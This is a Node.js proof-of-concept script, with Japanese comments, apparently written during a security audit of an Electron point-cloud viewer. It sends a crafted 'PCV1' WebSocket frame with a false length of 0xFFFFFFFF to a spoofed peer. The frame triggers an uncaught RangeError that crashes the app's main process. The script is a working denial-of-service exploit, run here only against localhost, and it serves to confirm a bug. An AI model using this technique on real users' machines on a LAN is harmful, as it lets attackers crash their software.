'use strict';
// PoC A: 悪意ある配信フレーム（PCV1, 点数を巨大に）で、配信を受ける側（Electron 主プロセス相当）が
// 例外で即終了することを実証する。
//   攻撃者: 同じ LAN で WebSocket 配信サーバを立て、ビーコンで被害者を誘導（ここでは peer を直接注入して再現）
//   被害者: live.js の startPeer で攻撃者サーバに接続し、ws.on('message') でフレームを復号する
// live.js の該当箇所: decodeBatch()（209-213 行）が n を信用して new Float32Array(buf, off, 3*n) を作る。
//   ws.on('message', d => { const b = decodeBatch(d); ... })（311 行）は try/catch で囲っていないため、
//   RangeError が未捕捉となり、主プロセスが落ちる。
const path = require('node:path');
const cp = require('node:child_process');
const APP = '/home/claude/pcd-viewer';
const WS = require(path.join(APP, 'node_modules', 'ws'));

if (process.argv[2] === 'victim') {
  // ---- 被害者（主プロセス相当）----
  const { Live } = require(path.join(APP, 'live.js'));
  const port = Number(process.argv[3]);
  const live = new Live();
  live.on('log', t => console.error('[victim log]', t));
  const key = `127.0.0.1:${port}`;
  // ビーコン受信で作られる peer を直接注入（なりすましビーコンと同等）
  live.finder.peers.set(key, { key, address: '127.0.0.1', port, name: 'ATTACKER', model: 'MID-360', sn: 'x', seen: Date.now() });
  live.startPeer(key).then(() => {
    console.error('[victim] connected to attacker, waiting for frame...');
  }).catch(e => { console.error('[victim] startPeer error', e.message); });
  // 10 秒で正常終了（クラッシュしなければ）
  setTimeout(() => { console.error('[victim] survived (no crash)'); live.close(); process.exit(0); }, 10000);
  return;
}

// ---- 攻撃者サーバ + 監督 ----
const server = new WS.Server({ port: 0 }, () => {
  const port = server.address().port;
  console.log('attacker ws server on', port);
  server.on('connection', ws => {
    console.log('victim connected; sending malicious PCV1 frame');
    // 'PCV1' + n=0xFFFFFFFF（長さの嘘）。被害者は new Float32Array(buf,8,3*n) を作ろうとする
    const bad = Buffer.alloc(8);
    bad.write('PCV1', 0, 'latin1');
    bad.writeUInt32LE(0xFFFFFFFF, 4);
    ws.send(bad);
  });
  const child = cp.fork(__filename, ['victim', String(port)], { stdio: ['ignore', 'inherit', 'inherit', 'ipc'] });
  const t0 = Date.now();
  child.on('exit', (code, sig) => {
    const dt = Date.now() - t0;
    console.log(`\n=== victim exited after ${dt}ms: code=${code} signal=${sig} ===`);
    if (code && code !== 0) console.log('RESULT: CRASH CONFIRMED (非ゼロ終了 = 未捕捉例外で主プロセス相当が落ちた)');
    else console.log('RESULT: no crash');
    server.close();
    process.exit(0);
  });
});
